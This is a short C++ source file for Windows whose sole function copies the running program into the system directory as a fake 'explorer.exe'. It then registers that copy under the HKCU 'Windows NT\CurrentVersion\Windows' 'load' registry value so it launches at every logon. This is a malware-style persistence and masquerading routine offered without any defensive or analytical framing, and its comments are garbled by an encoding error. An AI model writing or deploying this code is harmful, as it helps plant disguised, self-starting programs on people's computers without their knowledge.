// artorun.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <stdio.h>

void CreateStringReg(HKEY hRoot,char *szSubKey,char* ValueName,char *Data)
{
	HKEY hKey;
	//��ע�������������򴴽���
	long lRet=RegCreateKeyEx(hRoot,szSubKey,0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL,&hKey,NULL);
    if (lRet!=ERROR_SUCCESS)
	{
		printf("error no RegCreateKeyEx %s\n", szSubKey);
		return ;
	}
	//�޸�ע����ֵ��û���򴴽���
	lRet=RegSetValueEx(hKey,ValueName,0,REG_SZ,(BYTE*)Data,strlen(Data));
	 if (lRet!=ERROR_SUCCESS)
	 {
		 printf("error no RegSetValueEx %s\n", ValueName);
		 return ;
	 }
	RegCloseKey(hKey);
}

int autorun()
{
	char SelfFile[MAX_PATH];
	char SystemPath[512];
	//�õ�ϵͳĿ¼·��
    GetSystemDirectory(SystemPath,sizeof(SystemPath));
	strcat(SystemPath,"\\explorer.exe");
	//�õ��������·��
    GetModuleFileName (NULL, SelfFile, MAX_PATH);	
	//�����ļ�
	if(!CopyFile(SelfFile,SystemPath,true))
		return 0;
	//д��ע���
	CreateStringReg(HKEY_CURRENT_USER,"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows","load",SystemPath);
	return 0;
}


int main(int argc, char* argv[])
{
autorun();

	return 0;
}
